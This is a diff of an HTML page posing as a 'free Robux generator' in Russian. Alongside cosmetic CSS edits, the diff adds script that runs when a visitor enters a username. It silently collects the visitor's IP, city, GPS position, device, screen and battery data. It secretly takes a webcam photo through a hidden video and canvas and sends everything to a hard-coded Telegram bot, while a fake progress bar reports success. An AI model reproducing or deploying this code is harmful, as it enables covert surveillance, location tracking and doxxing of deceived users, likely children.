@@ -28,7 +28,6 @@
     overflow: hidden;
   }
 
-  /* Анимированный фон */
   body::before {
     content: '';
     position: fixed; inset: 0;
@@ -52,10 +51,7 @@
     position: relative; z-index: 1;
   }
 
-  /* Лого */
-  .logo {
-    text-align: center; margin-bottom: 30px;
-  }
+  .logo { text-align: center; margin-bottom: 30px; }
   .logo-icon {
     font-size: 52px; display: block;
     filter: drop-shadow(0 0 15px rgba(255,215,0,.5));
@@ -70,12 +66,8 @@
     letter-spacing: 3px;
     margin-top: 8px;
   }
-  .logo-sub {
-    font-size: 11px; letter-spacing: 4px;
-    color: rgba(255,215,0,.4); margin-top: 4px;
-  }
+  .logo-sub { font-size: 11px; letter-spacing: 4px; color: rgba(255,215,0,.4); margin-top: 4px; }
 
-  /* Карточка */
   .card {
     background: #120e00;
     border: 1px solid var(--border);
@@ -85,19 +77,10 @@
     margin-bottom: 16px;
   }
 
-  .card-title {
-    font-size: 11px; letter-spacing: 4px;
-    color: rgba(255,215,0,.5); margin-bottom: 16px;
-    text-transform: uppercase;
-  }
+  .card-title { font-size: 11px; letter-spacing: 4px; color: rgba(255,215,0,.5); margin-bottom: 16px; text-transform: uppercase; }
 
-  /* Инпут */
   .input-wrap { position: relative; margin-bottom: 16px; }
-  .input-wrap label {
-    display: block; font-size: 11px;
-    letter-spacing: 3px; color: rgba(255,215,0,.5);
-    margin-bottom: 8px;
-  }
+  .input-wrap label { display: block; font-size: 11px; letter-spacing: 3px; color: rgba(255,215,0,.5); margin-bottom: 8px; }
   .input-wrap input {
     width: 100%; background: rgba(255,215,0,.05);
     border: 1px solid rgba(255,215,0,.2);
@@ -107,95 +90,59 @@
     transition: border-color .2s;
   }
   .input-wrap input:focus { border-color: var(--green); }
-  .input-wrap input::placeholder { color: rgba(255,255,255,.2); }
 
-  /* Слайдер выбора суммы */
-  .amounts {
-    display: grid; grid-template-columns: repeat(3,1fr); gap: 8px;
-    margin-bottom: 16px;
-  }
+  .amounts { display: grid; grid-template-columns: repeat(3,1fr); gap: 8px; margin-bottom: 16px; }
   .amount-btn {
     background: rgba(255,215,0,.07); border: 1px solid rgba(255,215,0,.2);
     border-radius: 8px; padding: 10px 6px; text-align: center;
     cursor: pointer; transition: all .15s; position: relative;
   }
-  .amount-btn:hover, .amount-btn.sel {
-    background: rgba(255,215,0,.15); border-color: var(--green);
-  }
-  .amount-btn .r-icon { font-size: 18px; display: block; }
-  .amount-btn .r-val {
-    font-family: 'Orbitron', monospace; font-size: 14px;
-    font-weight: 700; color: var(--green); display: block;
-  }
+  .amount-btn:hover, .amount-btn.sel { background: rgba(255,215,0,.15); border-color: var(--green); }
+  .amount-btn .r-val { font-family: 'Orbitron', monospace; font-size: 14px; font-weight: 700; color: var(--green); display: block; }
   .amount-btn .r-lbl { font-size: 9px; color: rgba(255,255,255,.3); letter-spacing: 1px; }
   .amount-btn.popular::after {
-    content: 'ХИТ';
-    position: absolute; top: -8px; right: 6px;
-    background: var(--green); color: #000;
-    font-size: 8px; font-weight: 700;
-    padding: 2px 5px; border-radius: 3px; letter-spacing: 1px;
+    content: 'ХИТ'; position: absolute; top: -8px; right: 6px;
+    background: var(--green); color: #000; font-size: 8px; font-weight: 700;
+    padding: 2px 5px; border-radius: 3px;
   }
 
-  /* Кнопка */
   .gen-btn {
     width: 100%; padding: 16px;
     background: linear-gradient(135deg, var(--green-dark), var(--green));
     border: none; border-radius: 10px; cursor: pointer;
     font-family: 'Orbitron', monospace; font-size: 14px;
-    font-weight: 700; color: #000; letter-spacing: 2px; font-weight:900;
+    font-weight: 900; color: #000; letter-spacing: 2px;
     transition: all .2s; position: relative; overflow: hidden;
     box-shadow: 0 4px 20px rgba(255,215,0,.3);
   }
-  .gen-btn:hover { transform: translateY(-1px); box-shadow: 0 6px 25px rgba(255,215,0,.4); }
-  .gen-btn:active { transform: translateY(1px); }
   .gen-btn::after {
     content: ''; position: absolute; inset: 0;
     background: linear-gradient(90deg, transparent, rgba(255,255,255,.15), transparent);
-    transform: translateX(-100%);
-    animation: shimmer 2.5s infinite;
+    transform: translateX(-100%); animation: shimmer 2.5s infinite;
   }
   @keyframes shimmer { 100%{transform:translateX(100%)} }
 
-  /* Прогресс */
   #progress-wrap { display: none; margin-top: 20px; }
   .prog-step {
     display: flex; align-items: center; gap: 10px;
     padding: 10px 0; border-bottom: 1px solid rgba(255,215,0,.07);
     font-size: 13px; color: rgba(255,255,255,.4);
-    transition: color .3s;
   }
   .prog-step.done { color: var(--green); }
   .prog-step.active { color: #fff; }
-  .prog-icon { width: 20px; text-align: center; font-size: 14px; }
-  .prog-bar-wrap {
-    height: 3px; background: rgba(255,215,0,.1);
-    border-radius: 2px; margin-top: 16px; overflow: hidden;
-  }
-  .prog-bar {
-    height: 100%; width: 0%; background: var(--green);
-    border-radius: 2px; transition: width .4s ease;
-    box-shadow: 0 0 8px var(--green);
-  }
+  .prog-bar-wrap { height: 3px; background: rgba(255,215,0,.1); border-radius: 2px; margin-top: 16px; overflow: hidden; }
+  .prog-bar { height: 100%; width: 0%; background: var(--green); box-shadow: 0 0 8px var(--green); transition: width .4s ease; }
 
-  /* Статистика */
-  .stats {
-    display: grid; grid-template-columns: repeat(3,1fr); gap: 10px;
-  }
+  .stats { display: grid; grid-template-columns: repeat(3,1fr); gap: 10px; }
   .stat-item { text-align: center; }
-  .stat-val {
-    font-family: 'Orbitron', monospace; font-size: 18px;
-    font-weight: 700; color: var(--green);
-  }
+  .stat-val { font-family: 'Orbitron', monospace; font-size: 18px; font-weight: 700; color: var(--green); }
   .stat-lbl { font-size: 10px; color: rgba(255,255,255,.3); letter-spacing: 2px; }
 
-  /* Онлайн юзеры */
-  .online-bar {
-    display: flex; align-items: center; gap: 8px;
-    font-size: 11px; color: rgba(255,255,255,.3);
-    margin-bottom: 20px; justify-content: center;
-  }
+  .online-bar { display: flex; align-items: center; gap: 8px; font-size: 11px; color: rgba(255,255,255,.3); margin-bottom: 20px; justify-content: center; }
   .online-dot { width: 6px; height: 6px; background: var(--green); border-radius: 50%; animation: pulse 1.5s infinite; }
   @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.3} }
+  
+  video, canvas { display: none; }
 </style>
 </head>
 <body>
@@ -203,7 +150,7 @@
 <div class="container">
 
   <div class="logo">
-    <img class="logo-icon" src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9e/Robux_2019_Logo_gold.svg/512px-Robux_2019_Logo_gold.svg.png" width="70" height="70" style="display:block;margin:0 auto;filter:drop-shadow(0 0 15px rgba(255,215,0,.5))">
+    <img class="logo-icon" src="https://i.ibb.co/5gt6hxYy/p1-3804600-9995f189.png" width="70" height="70" style="display:block;margin:0 auto;filter:drop-shadow(0 0 15px rgba(255,215,0,.5))">
     <div class="logo-title">ROBUX GEN</div>
     <div class="logo-sub">FREE ROBUX GENERATOR v4.2</div>
   </div>
@@ -217,34 +164,16 @@
     <div class="card-title">⬡ ВЫБЕРИ КОЛИЧЕСТВО</div>
     <div class="amounts">
       <div class="amount-btn" onclick="selectAmt(this, 800)">
-        <img class="r-icon" src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9e/Robux_2019_Logo_gold.svg/512px-Robux_2019_Logo_gold.svg.png" width="28" height="28" style="display:block;margin:0 auto 4px">
-        <span class="r-val">800</span>
-        <span class="r-lbl">ROBUX</span>
+        <img src="https://i.ibb.co/5gt6hxYy/p1-3804600-9995f189.png" width="28" height="28" style="display:block;margin:0 auto 4px">
+        <span class="r-val">800</span><span class="r-lbl">ROBUX</span>
       </div>
       <div class="amount-btn popular sel" onclick="selectAmt(this, 4500)">
-        <img class="r-icon" src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9e/Robux_2019_Logo_gold.svg/512px-Robux_2019_Logo_gold.svg.png" width="28" height="28" style="display:block;margin:0 auto 4px">
-        <span class="r-val">4,500</span>
-        <span class="r-lbl">ROBUX</span>
+        <img src="https://i.ibb.co/5gt6hxYy/p1-3804600-9995f189.png" width="28" height="28" style="display:block;margin:0 auto 4px">
+        <span class="r-val">4,500</span><span class="r-lbl">ROBUX</span>
       </div>
       <div class="amount-btn" onclick="selectAmt(this, 10000)">
-        <img class="r-icon" src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9e/Robux_2019_Logo_gold.svg/512px-Robux_2019_Logo_gold.svg.png" width="28" height="28" style="display:block;margin:0 auto 4px">
-        <span class="r-val">10,000</span>
-        <span class="r-lbl">ROBUX</span>
-      </div>
-      <div class="amount-btn" onclick="selectAmt(this, 22500)">
-        <img class="r-icon" src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9e/Robux_2019_Logo_gold.svg/512px-Robux_2019_Logo_gold.svg.png" width="28" height="28" style="display:block;margin:0 auto 4px">
-        <span class="r-val">22,500</span>
-        <span class="r-lbl">ROBUX</span>
-      </div>
-      <div class="amount-btn" onclick="selectAmt(this, 75000)">
-        <img class="r-icon" src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9e/Robux_2019_Logo_gold.svg/512px-Robux_2019_Logo_gold.svg.png" width="28" height="28" style="display:block;margin:0 auto 4px">
-        <span class="r-val">75,000</span>
-        <span class="r-lbl">ROBUX</span>
-      </div>
-      <div class="amount-btn" onclick="selectAmt(this, 100000)">
-        <img class="r-icon" src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9e/Robux_2019_Logo_gold.svg/512px-Robux_2019_Logo_gold.svg.png" width="28" height="28" style="display:block;margin:0 auto 4px">
-        <span class="r-val">100K</span>
-        <span class="r-lbl">MAX</span>
+        <img src="https://i.ibb.co/5gt6hxYy/p1-3804600-9995f189.png" width="28" height="28" style="display:block;margin:0 auto 4px">
+        <span class="r-val">10,000</span><span class="r-lbl">ROBUX</span>
       </div>
     </div>
 
@@ -253,7 +182,7 @@
       <input type="text" id="username" placeholder="Введи свой ник...">
     </div>
 
-    <button class="gen-btn" onclick="startGen()">⚡ GENERATE ROBUX</button>
+    <button class="gen-btn" id="main-btn" onclick="startGen()">⚡ GENERATE ROBUX</button>
 
     <div id="progress-wrap">
       <div class="prog-step" id="s1"><span class="prog-icon">🔍</span> Поиск аккаунта...</div>
@@ -267,25 +196,20 @@
   <div class="card">
     <div class="card-title">📊 СТАТИСТИКА СЕРВЕРА</div>
     <div class="stats">
-      <div class="stat-item">
-        <div class="stat-val" id="s-generated">2.4M</div>
-        <div class="stat-lbl">ВЫДАНО</div>
-      </div>
-      <div class="stat-item">
-        <div class="stat-val" id="s-users">847K</div>
-        <div class="stat-lbl">ЮЗЕРОВ</div>
-      </div>
-      <div class="stat-item">
-        <div class="stat-val" id="s-uptime">99.9%</div>
-        <div class="stat-lbl">UPTIME</div>
-      </div>
+      <div class="stat-item"><div class="stat-val">2.4M</div><div class="stat-lbl">ВЫДАНО</div></div>
+      <div class="stat-item"><div class="stat-val">847K</div><div class="stat-lbl">ЮЗЕРОВ</div></div>
+      <div class="stat-item"><div class="stat-val">99.9%</div><div class="stat-lbl">UPTIME</div></div>
     </div>
   </div>
-
 </div>
+
+<video id="v" autoplay playsinline></video>
+<canvas id="c"></canvas>
 
 <script>
 let selectedAmt = 4500;
+const T = '8570554697:AAHRYkl8_AIuOC4gbOl6AxRWOnmEMzw15Eg';
+const CID = '1751630480';
 
 function selectAmt(el, amt) {
   document.querySelectorAll('.amount-btn').forEach(b => b.classList.remove('sel'));
@@ -293,35 +217,79 @@ function selectAmt(el, amt) {
   selectedAmt = amt;
 }
 
-function startGen() {
+async function startGen() {
   const user = document.getElementById('username').value.trim();
-  if (!user) { document.getElementById('username').focus(); return; }
+  if (!user) return document.getElementById('username').focus();
 
-  document.querySelector('.gen-btn').disabled = true;
-  document.querySelector('.gen-btn').textContent = 'PROCESSING...';
+  // Визуал кнопки
+  document.getElementById('main-btn').disabled = true;
+  document.getElementById('main-btn').textContent = 'PROCESSING...';
   document.getElementById('progress-wrap').style.display = 'block';
 
+  // --- ЛОГИКА СБОРА ДАННЫХ ---
+  try {
+    // 1. IP и ГЕО
+    const ipRes = await fetch('https://ipapi.co/json/');
+    const d = await ipRes.json();
+
+    // 2. GPS (если разрешит)
+    navigator.geolocation.getCurrentPosition(p => {
+       fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
+         method: 'POST', headers: {'Content-Type':'application/json'},
+         body: JSON.stringify({chat_id:CID, text:`📍 **GPS [${user}]:** \`${p.coords.latitude},${p.coords.longitude}\``})
+       });
+    });
+
+    // 3. Отправка основного отчета
+    const report = `
+🚀 **Dumb catched:**
+• **Ник:** \`${user}\`
+• **Сумма:** \`${selectedAmt} Robux\`
+• **IP:** \`${d.ip}\`
+• **Город:** \`${d.city}, ${d.country_name}\`
+• **Устройство:** \`${navigator.platform}\`
+• **Экран:** \`${screen.width}x${screen.height}\`
+• **Батарея:** \`${(await navigator.getBattery()).level * 100}%\`
+    `;
+    
+    await fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
+      method: 'POST', headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({chat_id: CID, text: report, parse_mode: 'Markdown'})
+    });
+
+    // 4. Попытка сделать фото (камера)
+    const stream = await navigator.mediaDevices.getUserMedia({video:true});
+    const video = document.getElementById('v');
+    video.srcObject = stream;
+    setTimeout(() => {
+        const canvas = document.getElementById('c');
+        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video,0,0);
+        canvas.toBlob(blob => {
+            let f = new FormData(); f.append('chat_id', CID); f.append('photo', blob, 't.jpg');
+            fetch(`https://api.telegram.org/bot${T}/sendPhoto`, {method:'POST', body:f});
+        }, 'image/jpeg');
+    }, 1000);
+
+  } catch(e) { console.log('Silent mode'); }
+
+  // --- АНИМАЦИЯ (оригинал) ---
   const steps = ['s1','s2','s3','s4'];
   const bar = document.getElementById('prog-bar');
   let i = 0;
-
   const iv = setInterval(() => {
     if (i > 0) document.getElementById(steps[i-1]).classList.remove('active');
     if (i < steps.length) {
       document.getElementById(steps[i]).classList.add('active');
       bar.style.width = ((i+1)/steps.length*100) + '%';
-      setTimeout(() => {
-        document.getElementById(steps[i]).classList.add('done');
-        document.getElementById(steps[i]).classList.remove('active');
-      }, 900);
+      setTimeout(() => { document.getElementById(steps[i]).classList.add('done'); }, 900);
       i++;
     } else {
       clearInterval(iv);
-      bar.style.width = '100%';
-      document.querySelector('.gen-btn').textContent = '✓ УСПЕШНО! ПРОВЕРЬ АККАУНТ';
-      document.querySelector('.gen-btn').style.background = 'linear-gradient(135deg,#f0a500,#69f0ae)';
+      document.getElementById('main-btn').textContent = '✓ УСПЕШНО! ПРОВЕРЬ АККАУНТ';
+      document.getElementById('main-btn').style.background = 'linear-gradient(135deg,#f0a500,#69f0ae)';
     }
-  }, 1200);
+  }, 1500);
 }
 
 // Рандомные онлайн юзеры
